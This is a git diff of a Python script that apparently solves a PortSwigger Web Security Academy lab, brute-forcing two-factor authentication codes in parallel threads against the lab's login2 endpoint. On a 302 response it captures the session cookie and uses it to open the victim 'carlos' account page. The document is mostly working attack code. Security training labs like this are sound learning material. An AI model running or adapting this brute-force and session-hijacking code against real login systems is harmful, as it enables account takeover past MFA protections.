@@ -1,10 +1,11 @@
 #https://portswigger.net/academy/labs/launch/28468f8ce00fc3bd7c323d598659c718d294c4aa39e6a5e2b244b48b1116493e?referrer=%2fweb-security%2fauthentication%2fmulti-factor%2flab-2fa-bypass-using-a-brute-force-attack
+#USE mfa-bruteforce-httpx FOR THE BEST OPTIMIZATION
 import requests
 import re
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-url = "https://0a0900db03ab6df7871d8d75004a00d7.web-security-academy.net"
+url = "https://0a3300670418fdb780ec7b14005b0005.web-security-academy.net"
 login = url + "/login"
 login2 = url + "/login2"
 
@@ -46,7 +47,8 @@ def try_code(mfa_code):
         # If success (redirect), return the working code
         if mfa_response.status_code == 302:
             print(f"[SUCCESS] Correct MFA Code: {mfa_code}")
-            return mfa_code
+            print(f"response: \n {mfa_response.headers}")
+            return mfa_response.headers
         return None
 
 # Parallel brute force loop
@@ -56,6 +58,12 @@ if __name__ == "__main__":
         for future in as_completed(futures):
             result = future.result()
             if result:
-                print(f"Found the working MFA code: {result}")
+                match = re.search(r'session=([^;]+)', result['set-cookie'])
+                if match:
+                    session_value = match.group(1)
+                carlos_url = url + result['location']
+                r = requests.get(url=carlos_url, headers={'Cookie': f'session={session_value}'})
+                #request the carlos account page to finish the lab
+                print(f"login status code: {r.status_code}")
                 executor.shutdown(wait=False)
                 break
